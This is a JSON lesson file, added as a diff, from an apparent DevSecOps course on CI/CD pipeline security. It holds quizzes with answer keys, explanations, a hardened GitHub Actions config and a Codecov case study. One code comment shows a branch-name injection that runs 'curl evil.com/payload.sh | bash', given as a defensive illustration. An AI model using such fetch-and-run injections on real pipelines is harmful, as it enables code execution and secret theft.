@@ -1,0 +1,154 @@
+{
+  "lesson_id": "d981f52c-785a-48e3-ab11-1651fecd3d48",
+  "lesson_number": "718",
+  "domain": "cloud",
+  "title": "CI/CD Pipeline Security",
+  "difficulty": 2,
+  "order_index": 50,
+  "prerequisites": [
+    "DevSecOps Fundamentals"
+  ],
+  "concepts": [
+    "CI/CD attacks",
+    "Pipeline secrets management",
+    "SAST/DAST",
+    "Supply chain security",
+    "Branch protection",
+    "Least privilege for pipelines"
+  ],
+  "estimated_time": 50,
+  "learning_objectives": [
+    "Identify the attack surface of CI/CD pipelines (source, build, artifact, deploy)",
+    "Understand pipeline injection attacks and how to prevent them",
+    "Implement secrets management in pipelines using vaults and environment variables",
+    "Apply SAST and SCA scanning in CI/CD workflows",
+    "Configure branch protection rules and code signing"
+  ],
+  "post_assessment": [
+    {
+      "question": "What is a 'pipeline injection' attack?",
+      "options": [
+        "Injecting SQL into a database query",
+        "Injecting malicious code into CI/CD pipeline steps through user-controlled input",
+        "Overloading a pipeline with too many jobs",
+        "Stealing credentials from a pipeline"
+      ],
+      "correct_answer": 1,
+      "explanation": "Pipeline injection occurs when user-controlled data (e.g., PR branch names, issue titles) flows into pipeline commands without sanitization.",
+      "type": "multiple_choice",
+      "difficulty": 2,
+      "question_id": "c085f39a-9e4d-420b-8040-8a6a038cdf46"
+    },
+    {
+      "question": "Why should secrets never be hardcoded in CI/CD configuration files?",
+      "options": [
+        "It slows down builds",
+        "Config files are version-controlled and visible to anyone with repo access",
+        "Hardcoded secrets expire faster",
+        "CI/CD tools don't support inline secrets"
+      ],
+      "correct_answer": 1,
+      "explanation": "Pipeline config files are stored in version control. Hardcoded secrets become permanently visible to anyone who can read the repository, including historical commits.",
+      "type": "multiple_choice",
+      "difficulty": 1,
+      "question_id": "af676927-98fd-407b-977c-dbc1fb0796de"
+    },
+    {
+      "question": "What is SAST in the context of CI/CD?",
+      "options": [
+        "A type of container security scan",
+        "Static Application Security Testing — analyzing source code for vulnerabilities without running it",
+        "Security testing of APIs at runtime",
+        "A firewall rule for pipeline traffic"
+      ],
+      "correct_answer": 1,
+      "explanation": "SAST (Static Application Security Testing) scans source code for security vulnerabilities before deployment. It runs during the build phase.",
+      "type": "multiple_choice",
+      "difficulty": 1,
+      "question_id": "08a5c83d-5937-447a-bb3a-fb14bce892bf"
+    },
+    {
+      "question": "What is a Software Composition Analysis (SCA) scan?",
+      "options": [
+        "Analyzing network traffic between microservices",
+        "Checking third-party dependencies for known vulnerabilities (CVEs)",
+        "Scanning container images for malware",
+        "Performance testing of software components"
+      ],
+      "correct_answer": 1,
+      "explanation": "SCA tools (Snyk, Dependabot, OWASP Dependency-Check) analyze your dependencies against vulnerability databases to find known CVEs.",
+      "type": "multiple_choice",
+      "difficulty": 2,
+      "question_id": "e933b3d1-74e4-410c-8cf8-e48713bbeff5"
+    },
+    {
+      "question": "What is the 'principle of least privilege' as applied to a CI/CD pipeline?",
+      "options": [
+        "Running all pipelines as root for reliability",
+        "Giving pipeline service accounts only the permissions needed for their specific job",
+        "Using the same credentials for all pipeline stages",
+        "Restricting who can view pipeline logs"
+      ],
+      "correct_answer": 1,
+      "explanation": "Pipeline service accounts should have minimal permissions — a build step doesn't need deploy access, a test step doesn't need production credentials.",
+      "type": "multiple_choice",
+      "difficulty": 2,
+      "question_id": "0bf886a3-d759-4106-b505-da9c0197723c"
+    }
+  ],
+  "jim_kwik_principles": [
+    "teach_like_im_10",
+    "active_learning",
+    "memory_hooks",
+    "connect_to_what_i_know",
+    "minimum_effective_dose",
+    "multiple_memory_pathways",
+    "learning_sprint",
+    "reframe_limiting_beliefs",
+    "gamify_it",
+    "meta_learning"
+  ],
+  "content_blocks": [
+    {
+      "type": "mindset_coach",
+      "content": "The SolarWinds attack, the Codecov breach, the XZ utils backdoor — all CI/CD supply chain attacks. Your pipeline has production credentials, deploys to prod, and runs code from pull requests by strangers. If you haven't secured it, you have an open door to everything you deploy."
+    },
+    {
+      "type": "explanation",
+      "content": "## CI/CD Attack Surface\n\nA typical pipeline has four vulnerable phases:\n\n```\n[Source]         → [Build]          → [Artifact]       → [Deploy]\nGit repos        Build servers      Container registry  Cloud/k8s\n• Branch perms   • Dependency CVEs  • Image signing     • IAM roles\n• Secret leaks   • Pipeline inject  • Registry access   • Least priv\n• PR reviews     • SAST/SCA gaps    • Supply chain      • Env secrets\n```\n\n**Top Pipeline Attack Vectors:**\n1. **Exposed secrets** in .env files, config, logs, or `env` dumps\n2. **Pipeline injection** — branch/tag names flowing into `run:` steps\n3. **Dependency confusion** — installing attacker packages via name squatting\n4. **Excessive permissions** — pipeline token has write access to all of prod\n5. **Unreviewed PRs triggering CI** — anyone's code running in your pipeline\n\n```yaml\n# DANGEROUS: GitHub Actions example\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - name: Print branch\n        run: echo \"Building ${{ github.head_ref }}\"  # INJECTION RISK!\n        # Attacker creates branch: main; curl evil.com/payload.sh | bash\n```"
+    },
+    {
+      "type": "explanation",
+      "content": "## Teach Me Like I'm 10\n\nImagine your CI/CD pipeline as a factory:\n- **Source** = the blueprint warehouse (your git repo)\n- **Build** = the assembly line\n- **Artifact** = the finished product storage\n- **Deploy** = shipping to customers\n\n**The danger:** This factory has keys to ship to real customers (production credentials). If someone sneaks a bad blueprint into the warehouse (malicious PR), the whole factory will manufacture and ship the bad product automatically.\n\n**Pipeline injection** = Like an employee slipping a note into the instructions saying 'also steal all the cash from the register.' If the manager reads instructions without checking, the theft happens.\n\n**Supply chain attack** = The factory orders screws from a supplier, but the supplier secretly coats them with poison. Every product made with those screws is poisoned, and the factory never knew."
+    },
+    {
+      "type": "code_exercise",
+      "content": "## Hands-On: Secure Pipeline Configuration\n\n```yaml\n# GitHub Actions - Secure Example\nname: Secure CI/CD Pipeline\n\non:\n  pull_request:\n    branches: [main]\n  push:\n    branches: [main]\n\n# Minimal permissions\npermissions:\n  contents: read\n  security-events: write  # For SAST results only\n\njobs:\n  security-scan:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4  # Pin to SHA, not tag!\n\n      # SAST scan\n      - name: Run Semgrep\n        uses: semgrep/semgrep-action@v1\n        with:\n          config: auto\n\n      # SCA - Dependency scanning\n      - name: Run Snyk\n        uses: snyk/actions/node@master\n        env:\n          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}  # From Secrets, NOT hardcoded!\n\n      # Container image scan\n      - name: Build and scan image\n        run: |\n          docker build -t myapp .\n          # Trivy scan\n          docker run --rm -v /var/run/docker.sock:/var/run/docker.sock \\\n            aquasec/trivy image myapp\n```\n\n```bash\n# Scan git history for leaked secrets\ngit log --all --full-history -- '**/config*' | grep -i 'password\\|secret\\|key'\n\n# gitleaks: scan for secrets in repos\ngitleaks detect --source . --report-format json\n```"
+    },
+    {
+      "type": "real_world",
+      "content": "## Real-World: The Codecov Supply Chain Attack (2021)\n\nAn attacker modified Codecov's bash uploader script. Thousands of companies used this script in their CI/CD pipelines. The malicious script:\n1. Extracted all environment variables from the pipeline (including secrets)\n2. Sent them to an attacker-controlled server\n\n**Impact:** Twilio, HashiCorp, Rapid7, and hundreds more had their CI/CD secrets compromised.\n\n**Lesson learned:**\n```yaml\n# BEFORE (dangerous):\n- run: bash <(curl -s https://codecov.io/bash)\n\n# AFTER (verified):\n- run: |\n    curl -s -o codecov.sh https://codecov.io/bash\n    sha256sum --check codecov.sha256  # verify before running!\n    bash codecov.sh\n```\n\nVerify everything you pull from the internet. Pin dependencies to specific SHAs."
+    },
+    {
+      "type": "memory_aid",
+      "content": "## Memory Hook: SPADE for Pipeline Security\n\n**S**ecrets — never hardcode, use vaults\n**P**ermissions — least privilege for pipeline tokens\n**A**nalysis — SAST + SCA on every build\n**D**ependencies — pin and verify with checksums\n**E**xecution — validate inputs, prevent injection\n\n**The golden rule:** 'Never trust the build environment.' Treat your pipeline like untrusted user input — sanitize everything, verify everything."
+    },
+    {
+      "type": "reflection",
+      "content": "## Reflection: Your Pipeline's Blast Radius\n\nAudit your current (or hypothetical) pipeline:\n1. What credentials does it have? List them.\n2. What can it do with those credentials? (read-only? full deploy? delete prod?)\n3. Who can trigger a pipeline run? (anyone with a PR? only approved contributors?)\n4. What external code does it pull in? (actions, scripts, containers)\n5. Are those external sources pinned or just 'latest'?\n\nThe answers to these questions define your supply chain risk. Most teams are shocked when they actually audit this."
+    },
+    {
+      "type": "mindset_coach",
+      "content": "Security in CI/CD isn't slowing down development. Done right, it's the opposite — automated scanning catches vulnerabilities before they reach prod, and incident response time drops from weeks to hours. Security in the pipeline is security as a competitive advantage."
+    }
+  ],
+  "tags": [
+    "CI/CD",
+    "DevSecOps",
+    "pipeline security",
+    "SAST",
+    "SCA",
+    "supply chain",
+    "cloud security"
+  ]
+}
